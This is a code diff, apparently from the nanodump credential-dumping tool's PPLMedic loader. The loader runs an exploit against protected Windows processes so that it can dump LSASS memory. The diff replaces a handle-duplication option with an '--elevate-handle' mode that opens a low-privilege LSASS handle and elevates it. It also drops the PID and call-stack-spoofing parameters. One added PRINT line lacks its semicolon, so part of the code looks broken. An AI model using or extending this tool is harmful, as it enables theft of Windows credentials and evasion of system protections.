@@ -175,11 +175,7 @@ int main(int argc, char* argv[])
     run_ppl_medic_exploit(
         nanodump_ppl_medic_dll,
         nanodump_ppl_medic_dll_len,
-        0,
         NULL,
-        FALSE,
-        FALSE,
-        FALSE,
         FALSE,
         FALSE);
 
@@ -196,9 +192,9 @@ void usage(char* procname)
     PRINT("            filename of the dump");
     PRINT("    --valid, -v");
     PRINT("            create a dump with a valid signature");
-    PRINT("Obtain an LSASS handle via:");
-    PRINT("    --duplicate, -d");
-    PRINT("            duplicate an existing " LSASS " handle");
+    PRINT("Avoid opening a handle with high privileges:")
+    PRINT("    --elevate-handle, -eh");
+    PRINT("            open a handle to " LSASS " with low privileges and duplicate it to gain higher privileges");
     PRINT("Help:");
     PRINT("    --help, -h");
     PRINT("            print this help message and leave");
@@ -206,13 +202,9 @@ void usage(char* procname)
 
 int main(int argc, char* argv[])
 {
-    DWORD  lsass_pid         = 0;
-    BOOL   duplicate_handle  = FALSE;
     BOOL   elevate_handle    = FALSE;
     LPSTR  dump_path         = NULL;
     BOOL   use_valid_sig     = FALSE;
-    BOOL   duplicate_elevate = FALSE;
-    DWORD  spoof_callstack   = 0;
 
     for (int i = 1; i < argc; ++i)
     {
@@ -231,10 +223,10 @@ int main(int argc, char* argv[])
             }
             dump_path = argv[++i];
         }
-        else if (!strncmp(argv[i], "-d", 3) ||
-                 !strncmp(argv[i], "--duplicate", 12))
+        else if (!strncmp(argv[i], "-eh", 4) ||
+                 !strncmp(argv[i], "--elevate-handle", 17))
         {
-            duplicate_handle = TRUE;
+            elevate_handle = TRUE;
         }
         else if (!strncmp(argv[i], "-h", 3) ||
                  !strncmp(argv[i], "--help", 7))
@@ -264,13 +256,9 @@ int main(int argc, char* argv[])
     run_ppl_medic_exploit(
         nanodump_ppl_medic_dll,
         nanodump_ppl_medic_dll_len,
-        lsass_pid,
         dump_path,
         use_valid_sig,
-        duplicate_handle,
-        elevate_handle,
-        duplicate_elevate,
-        spoof_callstack);
+        elevate_handle);
 
     return 0;
 }
